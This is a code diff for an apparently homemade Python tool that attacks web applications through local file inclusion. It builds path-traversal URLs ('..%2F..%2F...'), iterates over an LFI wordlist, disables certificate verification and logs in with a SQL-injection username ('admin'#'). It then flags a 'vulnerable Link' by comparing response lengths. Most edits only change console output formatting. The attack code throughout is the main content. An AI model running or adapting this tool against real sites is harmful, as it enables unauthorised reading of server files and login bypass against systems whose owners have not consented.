@@ -19,7 +19,7 @@ class Local_File_In :
             if self.args.Cookie:
                   with open(self.args.Cookie,'r') as Cookie_file :
                       self.Cookie =  Cookie_file.read()
-            print('\n'+'='*15+"\n[*] Input-INFO "+'\n'+'='*15+'\n')
+            print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
             if self.args.auth:
                print("[+] Login url        : ................ | : "+self.args.loginurl)
                print("[+] username         : ................ | : "+self.args.user)
@@ -28,7 +28,6 @@ class Local_File_In :
             print("[+] LFI-wordlist     : ................ | : "+self.args.filelist)
             print("[+] Vulnrenable url  : ................ | : "+self.args.Vulnurl)
             print("[+] web Cookies      : ................ | : "+self.Cookie) 
-            print('='*30+"\n[*] Web-Info "+'\n'+'='*15+'\n')
             if self.args.auth and self.args.Vulnurl\
             and self.args.password and self.args.user\
             and self.args.Cookie and self.args.loginurl\
@@ -79,7 +78,7 @@ class Local_File_In :
             LFI += self.args.Vulnurl
             LFI += "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
             ssl._create_default_https_context = ssl._create_unverified_context                
-            with  open('LFI-wordlist.txt','r') as list_command  :  
+            with  open(self.args.filelist,'r') as list_command  :  
                   list_command  = list_command .readlines()                                
             for command in list_command : 
                if self.args.auth:
@@ -96,26 +95,41 @@ class Local_File_In :
                                     ('username',"admin'#"),
                                     ('password','password')]
                first_req = request.open(self.args.Vulnurl).read()                                                      
-               Get_Oregnal_URL = request.open(self.url).read()                
+               Get_Oregnal_URL = request.open(self.url).read()  
+               print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
+               print("[+] Teating Links        : ................ | : "+command.replace('\n',''))  
+               sys.stdout.write('\x1b[1A')
+               sys.stdout.write('\x1b[2K') 
+               sys.stdout.write('\x1b[1A')
+               sys.stdout.write('\x1b[2K')
+               sys.stdout.write('\x1b[1A')
+               sys.stdout.write('\x1b[2K')                             
+               sys.stdout.write('\x1b[1A')
+               sys.stdout.write('\x1b[2K') 
+               sys.stdout.write('\x1b[1A')
+               sys.stdout.write('\x1b[2K')
+
+             
                #if self.args.auth and  len(Get_Oregnal_URL) !=   self.info[26] :
                if self.args.auth and len(Get_Oregnal_URL) != len(first_req) :                  
                   pythex = str(re.findall('Content-Length:.+',str(self.info)))
                   pythex= pythex.replace("['",'').replace("']",'')
                   if pythex in str(self.info):
-                    info = str(self.info).replace(pythex,'Content-Length:'+str(len(Get_Oregnal_URL)))
-                    rex2 = re.findall(':.+',info)
-                    print("[+] Date             : ................ | "+rex2[0])
-                    print("[+] Server           : ................ | "+rex2[1])
-                    print("[+] Expires          : ................ | "+rex2[2])
-                    print("[+] Cache-Control    : ................ | "+rex2[3])
-                    print("[+] Pragma           : ................ | "+rex2[4])
-                    print("[+] Vary             : ................ | "+rex2[5])
-                    print("[+] Content-Length   : ................ | "+str(rex2[6]).replace(':',': '))
-                    print("[+] Connection       : ................ | "+rex2[7])
-                    print("[+] Content-Type     : ................ | "+rex2[8])
-                    
-                    exit()      
-                  print(self.url)
+                     info = str(self.info).replace(pythex,'Content-Length:'+str(len(Get_Oregnal_URL)))
+                     rex2 = re.findall(':.+',info)
+                     print('='*20+"\n[*] Web-Info "+'\n'+'='*30+'\n')
+                     print("[+] Date             : ................ | "+rex2[0])
+                     print("[+] Server           : ................ | "+rex2[1])
+                     print("[+] Expires          : ................ | "+rex2[2])
+                     print("[+] Cache-Control    : ................ | "+rex2[3])
+                     print("[+] Pragma           : ................ | "+rex2[4])
+                     print("[+] Vary             : ................ | "+rex2[5])
+                     print("[+] Content-Length   : ................ | "+str(rex2[6]).replace(':',': '))
+                     print("[+] Connection       : ................ | "+rex2[7])
+                     print("[+] Content-Type     : ................ | "+rex2[8]+'\n')
+                     print('='*20+"\n[*] vulnerability Link  "+'\n'+'='*30+'\n')
+                     print("[+] vulnerable Link  : ................ | : "+self.url)
+                     exit()
                   with open('index3.htnl','w') as html:
                        html.write(str(Get_Oregnal_URL).replace("b'",''))
                   break 
